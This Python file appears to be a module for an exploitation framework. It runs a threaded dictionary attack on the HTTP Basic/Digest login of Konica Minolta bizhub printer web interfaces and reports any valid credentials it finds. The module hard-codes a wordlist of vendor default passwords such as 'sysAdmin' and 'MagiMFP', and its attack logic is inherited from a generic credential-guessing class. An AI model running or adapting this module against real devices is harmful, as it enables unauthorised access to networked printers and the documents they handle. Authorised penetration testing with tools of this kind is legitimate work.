# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.http_basic_digest_default import Exploit as HTTPBasicDigestDefault


class Exploit(HTTPBasicDigestDefault):
    """Konica Minolta bizhub Printer — Default Web Interface Credentials (HTTP Basic/Digest Auth).

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Konica Minolta bizhub Printer Default Web Interface Creds - HTTP Auth",
        "description": (
            "Module performs dictionary attack against Konica Minolta bizhub Printer Web Interface "
            "protected by HTTP Basic/Digest authentication. "
            "If valid credentials are found, they are displayed to the user."
        ),
        "authors": (
            "André Henrique (@mrhenrike) — EmbedXPL-Forge",
        ),
        "devices": (
            "Konica Minolta bizhub Printer",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP port")
    path = OptString("/", "Target path")

    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist(":0000,:1234,:MagiMFP,:sysAdmin,:0", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")
